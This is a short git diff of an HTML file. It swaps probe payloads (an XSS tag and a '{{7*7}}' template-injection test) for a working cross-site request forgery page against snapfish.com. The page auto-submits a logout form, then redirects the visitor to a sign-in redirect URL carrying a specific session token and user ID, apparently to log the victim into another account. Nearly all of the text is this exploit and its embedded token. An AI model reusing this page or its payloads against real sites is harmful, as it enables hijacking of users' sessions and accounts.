@@ -1,3 +1,17 @@
-<xss>MRX</xss>
-
-<html pwd="mrwx"><input>{{7*7}}</html>
+<html>
+  <body>
+    <form action="https://www.snapfish.com/logout" method="GET" target="_blank">
+		<input type="submit" value="CLICK ME" onclick="mrx()"/>
+	  </form>
+    <script>
+      document.forms[0].submit();
+      async function sleep(milliseconds) {
+        return new Promise(resolve => setTimeout(resolve, milliseconds));
+      }
+      async function mrx(){
+		await sleep(1000);
+		window.location.href="https://www.snapfish.com/webredirect?gsid=VOwphiJYnqYgyk1pHPN13X6q7cbsJSdd3sH0IGSLT5VulcxK9Awy6Ld7m%2BOIhmkAmJhPRqHr%2BzyvdaVg5NY%3D&o=signin&user_id=150759449060&next=https%3A%2F%2Fwww.snapfish.com%2Fhome"
+	  }
+</script>
+</body>
+</html>
